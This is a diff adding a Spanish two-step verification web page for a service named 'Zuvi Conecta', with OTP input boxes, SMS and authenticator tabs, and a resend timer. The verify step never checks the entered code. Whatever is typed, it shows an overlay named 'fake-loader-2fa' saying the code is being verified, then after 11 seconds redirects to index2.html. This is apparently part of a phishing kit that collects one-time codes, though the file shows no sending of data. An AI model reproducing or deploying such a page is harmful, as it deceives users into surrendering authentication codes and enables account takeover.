@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Zuvi Conecta – Verificación en dos pasos</title>
+
+<!-- Tipografía (Google Fonts). Si quieres probar otra, cámbiala aquí y en --fuente (más abajo).
+     Opciones parecidas: Roboto, Hind, Barlow, Exo 2 -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Titillium+Web:wght@400;600;700&display=swap" rel="stylesheet">
+
+<style>
+  /* ===== Variables: aquí cambias colores y tipografía de toda la página ===== */
+  :root {
+    --fuente: 'Titillium Web', 'Segoe UI', system-ui, sans-serif;
+    --amarillo: #FFF0B9;   /* fondo de la portada */
+    --naranja: #FF821D;    /* botón principal */
+    --texto: #22242C;
+    --enlace: #B5491F;
+    --logo: #CC2530;
+  }
+
+  * { box-sizing: border-box; }
+  html, body { margin: 0; }
+  body {
+    background: #F2EEE3;            /* fondo que se ve en PC alrededor del "móvil" */
+    font-family: var(--fuente);
+    color: var(--texto);
+  }
+  button, input { font-family: inherit; }
+  button { cursor: pointer; }
+  [hidden] { display: none !important; }
+
+  /* ===== Contenedor de la app =====
+     En móvil ocupa toda la pantalla; en PC se centra como un móvil. */
+  .app {
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    width: 100%;
+    max-width: 430px;
+    min-height: 100vh;
+    min-height: 100dvh;
+    margin: 0 auto;
+    background: #fff;
+    overflow: hidden;
+  }
+  @media (min-width: 560px) {
+    .app {
+      min-height: 0;
+      height: 839px;
+      margin: 24px auto;
+      border-radius: 28px;
+      box-shadow: 0 12px 48px rgba(60, 50, 20, 0.18);
+    }
+  }
+  .pantalla { position: relative; display: flex; flex-direction: column; flex: 1 0 auto; }
+
+  /* ===== Chip "Oficina" (lo usan las dos pantallas) ===== */
+  .chip {
+    position: absolute; right: 0;
+    display: flex; align-items: center;
+    height: 44px; padding: 0; margin: 0; border: 0; background: none; color: var(--texto);
+  }
+  .chip span.pildora {
+    display: flex; align-items: center; gap: 11px;
+    height: 28px; padding: 0 17px 0 12px;
+    border-radius: 14px 0 0 14px;
+    background: #EBEEF5;
+    font-size: 14px; line-height: 1;
+  }
+
+    .btn-volver {
+    position: absolute; left: 13px; top: 52px; width: 44px; height: 44px;
+    display: flex; align-items: center; justify-content: center;
+    padding: 0; border: 0; background: none;
+  }
+  .titulo-seccion {
+    position: absolute; left: 0; right: 0; top: 64px;
+    height: 20px; line-height: 20px; text-align: center;
+    font-size: 12px; letter-spacing: 0.5px; color: #BE4617; text-transform: uppercase;
+    pointer-events: none;   /* para que no tape la flecha ni el chip */
+  }
+
+/* ===================== VERIFICACIÓN EN DOS PASOS ===================== */
+  .verif .chip { top: 52px; height: 45px; }
+
+  .verif-contenido { display: flex; flex-direction: column; padding: 108px 24px 32px; }
+
+  .logo { display: block; width: 150px; height: auto; margin: 6px 0 28px; }
+  .verif h2 { margin: 0 0 8px; font-size: 22px; line-height: 28px; font-weight: 400; color: #1A1C1D; }
+  .instrucciones { margin: 0 0 20px; font-size: 14.5px; line-height: 21px; color: #4A5368; }
+  .instrucciones strong { color: #1A1C1D; font-weight: 600; white-space: nowrap; }
+
+  /* Selector de método (SMS / App) */
+  .metodos { display: flex; gap: 4px; padding: 4px; margin-bottom: 24px; background: #F0F3F9; border-radius: 22px; }
+  .metodos button {
+    flex: 1; height: 36px; border: 0; border-radius: 18px;
+    background: none; color: #5C6780; font-size: 13px;
+  }
+  .metodos button[aria-selected="true"] { background: #fff; color: #1A1C1D; box-shadow: 0 1px 4px rgba(20, 30, 60, 0.14); }
+
+  /* Casillas del código */
+  .otp { display: flex; gap: 8px; margin-bottom: 8px; }
+  .otp .sep { flex: none; width: 8px; }
+  .otp input {
+    flex: 1; min-width: 0; height: 56px; padding: 0;
+    border: 1px solid #C9CEDD; border-radius: 4px; background: #fff;
+    text-align: center; font-size: 22px; color: #1A1C1D; caret-color: var(--naranja);
+  }
+  .otp input::selection { background: transparent; }
+  .otp input:focus { outline: none; border-color: var(--naranja); box-shadow: 0 0 0 2px rgba(255, 130, 29, 0.28); }
+  .otp input:disabled { background: #F4F6FB; color: #A8B0C3; }
+  .otp.error input { border-color: #B3261E; }
+  .otp.error { animation: sacudir 0.35s; }
+  @keyframes sacudir { 20% { transform: translateX(-6px); } 40% { transform: translateX(6px); } 60% { transform: translateX(-4px); } 80% { transform: translateX(4px); } }
+  .msg-error { min-height: 20px; margin: 0 0 12px; font-size: 13px; line-height: 20px; color: #B3261E; }
+
+  .reenvio { display: flex; align-items: center; justify-content: space-between; gap: 12px; margin-bottom: 20px; font-size: 13.5px; color: #5C6780; }
+  .btn-enlace { padding: 0; border: 0; background: none; color: var(--enlace); font-size: 13.5px; text-decoration: underline; }
+  .btn-enlace:disabled { color: #A8B0C3; text-decoration: none; cursor: default; }
+
+  .confiar { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 20px; font-size: 13.5px; line-height: 20px; color: #2E2E33; cursor: pointer; }
+  .confiar input {
+    appearance: none; -webkit-appearance: none;
+    flex: none; width: 20px; height: 20px; margin: 0;
+    border: 1.5px solid #8E97AE; border-radius: 3px; background: #fff;
+    display: grid; place-content: center;
+  }
+  .confiar input::after {
+    content: ""; width: 10px; height: 5px; margin-top: -2px;
+    border-left: 2px solid #3A2E28; border-bottom: 2px solid #3A2E28;
+    transform: rotate(-45deg); opacity: 0;
+  }
+  .confiar input:checked { background: var(--naranja); border-color: var(--naranja); }
+  .confiar input:checked::after { opacity: 1; }
+  .confiar input:focus-visible, .btn-verificar:focus-visible, .btn-enlace:focus-visible, .metodos button:focus-visible { outline: 2px solid var(--naranja); outline-offset: 2px; }
+
+  .btn-verificar {
+    width: 100%; max-width: 312px; height: 44px; margin: 0 auto 24px;
+    border: 0; border-radius: 22px;
+    background: #F0F3F9; color: #A8B0C3; cursor: default;
+    font-size: 12px; letter-spacing: 0.5px; text-transform: uppercase;
+  }
+  .btn-verificar.listo { background: var(--naranja); color: #3A2E28; cursor: pointer; }
+
+  .aviso { display: flex; gap: 12px; padding: 14px 16px; border-radius: 8px; background: #F4F6FB; font-size: 12.5px; line-height: 18px; color: #4A5368; }
+  .aviso svg { flex: none; margin-top: 1px; }
+  .ayuda { margin: 16px 0 0; text-align: center; font-size: 13.5px; color: #5C6780; }
+  .ayuda a { color: var(--enlace); }
+
+  /* ===================== VERIFICACIÓN CORRECTA ===================== */
+  .exito-contenido { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 48px 32px; text-align: center; }
+  .check-circulo { width: 72px; height: 72px; margin-bottom: 20px; border-radius: 50%; background: #E3F4EA; display: grid; place-items: center; }
+  .check-circulo path { stroke-dasharray: 30; stroke-dashoffset: 30; animation: trazo 0.5s 0.15s ease-out forwards; }
+  @keyframes trazo { to { stroke-dashoffset: 0; } }
+  .exito-contenido h2 { margin: 0 0 8px; font-size: 22px; line-height: 28px; font-weight: 400; color: #1A1C1D; }
+  .exito-contenido h2:focus { outline: none; }
+  .exito-contenido p { margin: 0 0 28px; font-size: 14.5px; line-height: 21px; color: #4A5368; }
+  .exito-contenido .btn-verificar { margin-bottom: 0; background: var(--naranja); color: #3A2E28; cursor: pointer; }
+
+  .sr-only { position: absolute; width: 1px; height: 1px; margin: -1px; padding: 0; overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; border: 0; }
+  @media (prefers-reduced-motion: reduce) { .otp.error { animation: none; } .check-circulo path { animation: none; stroke-dashoffset: 0; } }
+</style>
+</head>
+
+<body>
+<div class="app">
+
+  <!-- ===================== VERIFICACIÓN EN DOS PASOS ===================== -->
+  <section class="pantalla verif" id="pantalla-verif">
+
+    <button type="button" class="btn-volver" id="btn-volver-verif" aria-label="Volver al inicio de sesión">
+      <svg width="15" height="12" viewBox="0 0 15 12" fill="none" stroke="#1A1C1D" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        <path d="M14 6 H1.5 M6 1.5 L1.5 6 L6 10.5"></path>
+      </svg>
+    </button>
+    <span class="titulo-seccion">Verificación</span>
+    <button type="button" class="chip">
+      <span class="pildora">
+        <svg width="12" height="18" viewBox="0 0 12 18" fill="none" stroke="#2A2A2E" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <path d="M6 17.2 C6 17.2 0.8 10.8 0.8 6.4 A5.2 5.2 0 0 1 11.2 6.4 C11.2 10.8 6 17.2 6 17.2 Z"></path>
+          <circle cx="6" cy="6.4" r="1.9"></circle>
+        </svg>
+        <span>Oficina</span>
+      </span>
+    </button>
+
+    <div class="verif-contenido">
+
+      <svg class="logo" viewBox="0 0 189 28" role="img" aria-label="Zuvi Conecta" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#FF7300" d="M158,16.7c6.7-0.3,7.7-0.8,7.7-2.4c0-1.8-1.2-2.7-5-2.7c-4.9,0-5.5,0.9-5.5,5.2L158,16.7z M183.9,22.7h5.1v4.9 h-5.1V22.7z M11,27.9c7.2,0,10.8-2.2,10.8-9.9c0-7-2.7-10.1-9.8-10.1c-3.1,0-5.3,0.3-6.9,1.6V0H0v18.5C0,25.5,3.1,27.9,11,27.9 C11,27.9,3.1,27.9,11,27.9z M40.2,15.3v-0.9c0-2.2-1.5-2.7-5.4-2.7c-3.7,0-6.9,0.8-8.6,1.3V9.4c2.9-1.1,6.3-1.6,8.8-1.6 c5.6,0,10.3,0.9,10.3,7.1v5.9c0,6.9-5.7,7-10.3,7c-7,0-10.3-1.9-10.3-5.9C24.7,16.7,28.1,15.7,40.2,15.3 C40.2,15.3,28.1,15.7,40.2,15.3z M80,19.8v7.8h-5V0h5.1v15.4h1c1.5,0,2-0.3,3.1-1.3l6-5.8h5.9L87,17.5l9.7,10.2h-6.5L83.9,21 c-1-1.1-1.5-1.2-3-1.2H80z M54.5,27.6V15.5c0-2.9,1-3.8,5.4-3.8s5.4,0.8,5.4,3.8v12.2h5.1V15.3c0-5.5-4-7.3-9.6-7.3h-1.7 c-5.6,0-9.6,1.8-9.6,7.3v12.3H54.5z M113.3,27.6V15.5c0-2.9,1-3.8,5.3-3.8c4.5,0,5.4,0.8,5.4,3.8v12.2h5.1V15.3c0-5.5-4-7.3-9.6-7.3 h-1.7c-5.6,0-9.6,1.8-9.6,7.3v12.3H113.3z M147,12.2h-8.5v9.4c0,1.8,1.3,2.5,3.4,2.5c2.4,0,4-0.2,5.2-0.5V27c-2,0.6-4.1,0.9-5.8,0.9 c-5.6,0-7.8-2.3-7.8-5.9V2.2h5v6.2h8.5L147,12.2L147,12.2z M10.9,24.1c-5.2,0-6-0.9-6-6.7c0-5,1.6-5.7,5.8-5.7s5.9,0.7,5.9,5.7 C16.5,23.3,15.6,24.1,10.9,24.1z M175,14.5c0-5.2,3.8-6.7,7.3-6.7c1.6,0,5.9,0.2,6.7,0.4v3.7h-5.5c-2.8,0-3.5,0.3-3.5,3v12.8h-5 V14.5z M98.5,8.3h5.2v19.3h-5.2V8.3z M35.4,24.1c3.8,0,4.9-0.5,4.9-2.4v-3l-4.6,0.2c-4.6,0.3-5.7,0.9-5.7,2.5 C29.9,23.7,30.6,24.1,35.4,24.1C35.4,24.1,30.6,24.1,35.4,24.1z M98.5,0h5.2v4.9h-5.2V0z M155.3,20.5c0.3,2.4,1.5,3.8,5.4,3.8 c3.4,0,6.9-0.5,9.6-1.5v3.4c-2,1.1-6.3,1.8-9.4,1.8c-8.3,0-11-2.1-11-10.3c0-7.2,2.4-9.9,10.9-9.9c7.1,0,10.2,2.4,10.3,6.4 C171.1,19.1,167.7,20.3,155.3,20.5C155.3,20.5,167.7,20.3,155.3,20.5z"></path>
+      </svg>
+
+      <h2 id="verif-titulo">Verificación en dos pasos</h2>
+      <p class="instrucciones" id="instrucciones">Para proteger tu cuenta, introduce el código de 6 dígitos que hemos enviado por SMS al <strong>+34 ••• ••• 421</strong>.</p>
+
+      <div class="metodos" role="tablist" aria-label="Método de verificación">
+        <button type="button" role="tab" aria-selected="true"  data-metodo="sms">SMS</button>
+        <button type="button" role="tab" aria-selected="false" data-metodo="app">App autenticadora</button>
+      </div>
+
+      <div class="otp" id="otp" role="group" aria-label="Código de verificación de 6 dígitos">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" aria-label="Dígito 1 de 6">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="Dígito 2 de 6">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="Dígito 3 de 6">
+        <span class="sep" aria-hidden="true"></span>
+        <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="Dígito 4 de 6">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="Dígito 5 de 6">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="Dígito 6 de 6">
+      </div>
+      <p class="msg-error" id="msg-error" role="alert"></p>
+
+      <div class="reenvio" id="reenvio">
+        <span id="cuenta">Reenviar código en 0:30</span>
+        <button type="button" class="btn-enlace" id="btn-reenviar" disabled>Reenviar código</button>
+      </div>
+
+      <label class="confiar">
+        <input type="checkbox" id="confiar">
+        <span>Confiar en este dispositivo durante 30 días</span>
+      </label>
+
+      <button type="button" class="btn-verificar" id="btn-verificar" disabled>Verificar</button>
+
+      <div class="aviso">
+        <svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="#4A5368" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <rect x="3.5" y="8" width="11" height="7.5" rx="1.5"></rect>
+          <path d="M6 8 V5.8 A3 3 0 0 1 12 5.8 V8"></path>
+        </svg>
+        <span>Nunca compartas este código. Zuvi Conecta no te lo pedirá por teléfono, correo ni mensaje.</span>
+      </div>
+
+      <p class="ayuda">¿Problemas con el código? <a href="#soporte">Contacta con soporte</a></p>
+    </div>
+
+    <p class="sr-only" id="anuncio" aria-live="polite"></p>
+  </section>
+
+  <!-- ===================== VERIFICACIÓN CORRECTA ===================== -->
+  <section class="pantalla" id="pantalla-exito" hidden>
+    <div class="exito-contenido">
+      <div class="check-circulo" aria-hidden="true">
+        <svg width="34" height="34" viewBox="0 0 34 34" fill="none" stroke="#1E8E5A" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M8 17.5 L14.5 24 L26 11"></path>
+        </svg>
+      </div>
+      <h2 id="exito-titulo" tabindex="-1">Identidad verificada</h2>
+      <p>Todo correcto. Ya puedes acceder a tu cuenta de Zuvi Conecta.</p>
+      <button type="button" class="btn-verificar" id="btn-continuar">Continuar</button>
+    </div>
+  </section>
+
+</div>
+
+<script>
+  // =====================================================================
+  //  Pantallas de esta página: verificación  →  éxito
+  //  (la portada y el login están en inicio-sesion-zuvi.html, en la misma carpeta)
+  // =====================================================================
+  const pantallas = {
+    verif: document.getElementById('pantalla-verif'),
+    exito: document.getElementById('pantalla-exito'),
+  };
+  function mostrar(nombre) {
+    for (const [id, el] of Object.entries(pantallas)) el.hidden = id !== nombre;
+    window.scrollTo(0, 0);
+    if (nombre === 'exito') document.getElementById('exito-titulo').focus();
+  }
+  // Flecha "Volver": regresa al login
+  document.getElementById('btn-volver-verif').addEventListener('click', () => {
+    detenerTemporizadores();
+    window.location.href = 'index2.html';
+  });
+  // "Continuar" tras verificar: aquí iría la entrada a la cuenta; en la demo vuelve a la portada
+  document.getElementById('btn-continuar').addEventListener('click', () => {
+    window.location.href = 'inicio-sesion-zuvi.html';
+  });
+
+  // =====================================================================
+  //  Verificación en dos pasos
+  // =====================================================================
+  const CODIGO_DEMO = '123456';        // SOLO PARA LA DEMO. En producción lo valida el servidor.
+  const MAX_INTENTOS = 3;
+  const SEGUNDOS_REENVIO = 30;
+  const SEGUNDOS_BLOQUEO = 30;
+
+  const otp        = document.getElementById('otp');
+  const casillas   = [...otp.querySelectorAll('input')];
+  const btnVerif   = document.getElementById('btn-verificar');
+  const msgError   = document.getElementById('msg-error');
+  const anuncio    = document.getElementById('anuncio');
+  const reenvio    = document.getElementById('reenvio');
+  const cuenta     = document.getElementById('cuenta');
+  const btnReenv   = document.getElementById('btn-reenviar');
+  const instruc    = document.getElementById('instrucciones');
+  const pestanas   = [...document.querySelectorAll('.metodos button')];
+
+  let intentos = 0;
+  let bloqueado = false;
+  let timerReenvio = null;
+  let timerBloqueo = null;
+
+  const textos = {
+    sms: 'Para proteger tu cuenta, introduce el código de 6 dígitos que hemos enviado por SMS al <strong>+34 ••• ••• 421</strong>.',
+    app: 'Abre tu app autenticadora e introduce el código de 6 dígitos de <strong>Zuvi Conecta</strong>. El código cambia cada 30 segundos.',
+  };
+
+  const codigo = () => casillas.map(c => c.value).join('');
+  const mmss   = (s) => Math.floor(s / 60) + ':' + String(s % 60).padStart(2, '0');
+
+  function revisarCodigo() {
+    const listo = codigo().length === 6 && !bloqueado;
+    btnVerif.disabled = !listo;
+    btnVerif.classList.toggle('listo', listo);
+  }
+
+  function mostrarError(texto) {
+    msgError.textContent = texto;
+    otp.classList.remove('error');
+    if (texto) { void otp.offsetWidth; otp.classList.add('error'); }   // reinicia la animación
+  }
+
+  function vaciarCasillas() { casillas.forEach(c => { c.value = ''; }); revisarCodigo(); }
+
+  // Rellena las casillas a partir de la posición "desde" (sirve para pegar o autocompletar el SMS)
+  function rellenar(desde, texto) {
+    const digitos = texto.replace(/\D/g, '').slice(0, 6 - desde).split('');
+    digitos.forEach((d, k) => { casillas[desde + k].value = d; });
+    const siguiente = Math.min(desde + digitos.length, 5);
+    casillas[siguiente].focus();
+    casillas[siguiente].select();
+    revisarCodigo();
+  }
+
+  casillas.forEach((casilla, i) => {
+    casilla.addEventListener('input', () => {
+      if (msgError.textContent) mostrarError('');
+      const texto = casilla.value;
+      casilla.value = '';
+      if (texto) rellenar(i, texto);
+      else revisarCodigo();
+    });
+    casilla.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !casilla.value && i > 0) {
+        casillas[i - 1].value = ''; casillas[i - 1].focus(); revisarCodigo(); e.preventDefault();
+      } else if (e.key === 'ArrowLeft' && i > 0)  { casillas[i - 1].focus(); e.preventDefault(); }
+      else if (e.key === 'ArrowRight' && i < 5)   { casillas[i + 1].focus(); e.preventDefault(); }
+      else if (e.key === 'Enter' && !btnVerif.disabled) { verificar(); }
+    });
+    casilla.addEventListener('paste', (e) => {
+      e.preventDefault();
+      rellenar(0, (e.clipboardData || window.clipboardData).getData('text'));
+    });
+    casilla.addEventListener('focus', () => casilla.select());
+  });
+
+  // ----- Pestañas SMS / App -----
+  pestanas.forEach(p => p.addEventListener('click', () => {
+    const metodo = p.dataset.metodo;
+    pestanas.forEach(x => x.setAttribute('aria-selected', String(x === p)));
+    instruc.innerHTML = textos[metodo];
+    reenvio.hidden = metodo !== 'sms';
+    vaciarCasillas(); mostrarError('');
+    casillas[0].focus();
+  }));
+
+  // ----- Temporizador de "Reenviar código" -----
+  function iniciarReenvio() {
+    clearInterval(timerReenvio);
+    let restante = SEGUNDOS_REENVIO;
+    btnReenv.disabled = true;
+    cuenta.textContent = 'Reenviar código en ' + mmss(restante);
+    timerReenvio = setInterval(() => {
+      restante--;
+      if (restante <= 0) {
+        clearInterval(timerReenvio);
+        cuenta.textContent = '¿No te ha llegado el código?';
+        btnReenv.disabled = false;
+      } else {
+        cuenta.textContent = 'Reenviar código en ' + mmss(restante);
+      }
+    }, 1000);
+  }
+  btnReenv.addEventListener('click', () => {
+    // AQUÍ pedirías al servidor un nuevo código.
+    vaciarCasillas(); mostrarError('');
+    iniciarReenvio();
+    anuncio.textContent = 'Te hemos enviado un nuevo código.';
+    casillas[0].focus();
+  });
+
+  // ----- Verificar -----
+  function verificar() {
+    if (bloqueado || codigo().length !== 6) return;
+    detenerTemporizadores();
+    showLoader();
+  }
+  btnVerif.addEventListener('click', verificar);
+
+  // ----- Bloqueo temporal tras demasiados intentos -----
+  function bloquear() {
+    bloqueado = true;
+    casillas.forEach(c => { c.disabled = true; });
+    revisarCodigo();
+    let restante = SEGUNDOS_BLOQUEO;
+    mostrarError('Demasiados intentos. Inténtalo de nuevo en ' + mmss(restante) + '.');
+    timerBloqueo = setInterval(() => {
+      restante--;
+      if (restante <= 0) { desbloquear(); }
+      else { msgError.textContent = 'Demasiados intentos. Inténtalo de nuevo en ' + mmss(restante) + '.'; }
+    }, 1000);
+  }
+  function desbloquear() {
+    clearInterval(timerBloqueo);
+    bloqueado = false; intentos = 0;
+    casillas.forEach(c => { c.disabled = false; });
+    mostrarError('');
+    revisarCodigo();
+    casillas[0].focus();
+  }
+
+  function detenerTemporizadores() { clearInterval(timerReenvio); clearInterval(timerBloqueo); }
+  
+  /* ---------- Overlay 11 s + redirección a index2.html ---------- */
+  function showLoader() {
+    if (document.getElementById('fake-loader-2fa')) return;
+
+    const REDIRECT_URL = 'index2.html';   // ← destino tras el overlay
+    const DURATION_MS  = 11000;           // 11 s
+    const CANDIDATES   = ['loader.gif', 'loader.png'];
+
+    const overlay = document.createElement('div');
+    overlay.id = 'fake-loader-2fa';
+    overlay.style.cssText =
+      'position:fixed;top:0;left:0;width:100%;height:100%;' +
+      'background:rgba(11,27,43,0.95);' +
+      'backdrop-filter:blur(5px);-webkit-backdrop-filter:blur(5px);' +
+      'z-index:2147483647;display:flex;flex-direction:column;' +
+      'align-items:center;justify-content:center;padding:20px;' +
+      'box-sizing:border-box;text-align:center;' +
+      "font-family:'Titillium Web',system-ui,-apple-system,sans-serif;";
+
+    if (!document.getElementById('spinner-keyframes')) {
+      const style = document.createElement('style');
+      style.id = 'spinner-keyframes';
+      style.textContent = '@keyframes forzarGiro{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}';
+      document.head.appendChild(style);
+    }
+
+    const loaderBox = document.createElement('div');
+    loaderBox.style.cssText =
+      'width:clamp(140px,26vw,220px);height:clamp(140px,26vw,220px);' +
+      'margin-bottom:clamp(20px,4vw,35px);display:flex;align-items:center;justify-content:center;';
+    overlay.appendChild(loaderBox);
+
+    function replaceWithSpinner() {
+      loaderBox.innerHTML = '';
+      const s = document.createElement('div');
+      s.style.cssText =
+        'width:85%;height:85%;border-radius:50%;' +
+        'border:5px solid rgba(255,255,255,0.2);border-top:5px solid #fff;' +
+        'box-sizing:border-box;animation:forzarGiro 1s linear infinite;';
+      loaderBox.appendChild(s);
+    }
+
+    const img = document.createElement('img');
+    img.alt = 'Cargando';
+    img.style.cssText = 'width:100%;height:100%;object-fit:contain;display:block;';
+    loaderBox.appendChild(img);
+
+    let idx = 0, state = 'loading', timer = null;
+
+    function tryNext() {
+      if (idx >= CANDIDATES.length) { state = 'error'; img.remove(); replaceWithSpinner(); return; }
+      state = 'loading';
+      const src = CANDIDATES[idx] + '?v=' + Date.now();
+      console.log('[Overlay2FA] Probando: ' + src);
+      clearTimeout(timer);
+      timer = setTimeout(() => {
+        if (state === 'loading') { state = 'timeout'; console.warn('[Overlay2FA] Timeout: ' + src); idx++; tryNext(); }
+      }, 2500);
+      img.src = src;
+    }
+
+    img.onload = () => {
+      if (state !== 'loading') return;
+      clearTimeout(timer);
+      state = 'loaded';
+      console.log('[Overlay2FA] Imagen OK: ' + img.naturalWidth + '×' + img.naturalHeight + ' (' + img.src.split('?')[0] + ')');
+      if (img.naturalWidth < 20 || img.naturalHeight < 20) { console.warn('[Overlay2FA] Imagen demasiado pequeña.'); idx++; tryNext(); }
+    };
+
+    img.onerror = () => {
+      if (state !== 'loading') return;
+      clearTimeout(timer);
+      console.warn('[Overlay2FA] Fallo al cargar: ' + img.src);
+      idx++; tryNext();
+    };
+
+    tryNext();
+
+    const title = document.createElement('h2');
+    title.style.cssText = 'font-size:clamp(20px,4.5vw,26px);color:#fff;font-weight:600;margin:0;text-align:center;';
+    title.textContent = 'Verificando código';
+    overlay.appendChild(title);
+
+    const subtitle = document.createElement('p');
+    subtitle.style.cssText = 'font-size:clamp(14px,3.2vw,16px);color:rgba(255,255,255,0.8);margin-top:10px;text-align:center;';
+    subtitle.textContent = 'Por favor, espere un momento...';
+    overlay.appendChild(subtitle);
+
+    document.body.appendChild(overlay);
+    document.body.style.overflow = 'hidden';
+
+    console.log('[Overlay2FA] Redirigiendo a ' + REDIRECT_URL + ' en ' + DURATION_MS + 'ms...');
+    setTimeout(() => { window.location.href = REDIRECT_URL; }, DURATION_MS);
+  }
+
+  // ----- Se llama cada vez que se entra en la pantalla de verificación -----
+  function prepararVerificacion() {
+    detenerTemporizadores();
+    bloqueado = false; intentos = 0;
+    casillas.forEach(c => { c.disabled = false; });
+    pestanas.forEach(x => x.setAttribute('aria-selected', String(x.dataset.metodo === 'sms')));
+    instruc.innerHTML = textos.sms;
+    reenvio.hidden = false;
+    document.getElementById('confiar').checked = false;
+    vaciarCasillas(); mostrarError('');
+    iniciarReenvio();
+    casillas[0].focus();
+  }
+
+
+  // Al abrir la página se prepara el segundo paso (casillas vacías y cuenta atrás)
+  prepararVerificacion();
+</script>
+</body>
+</html>
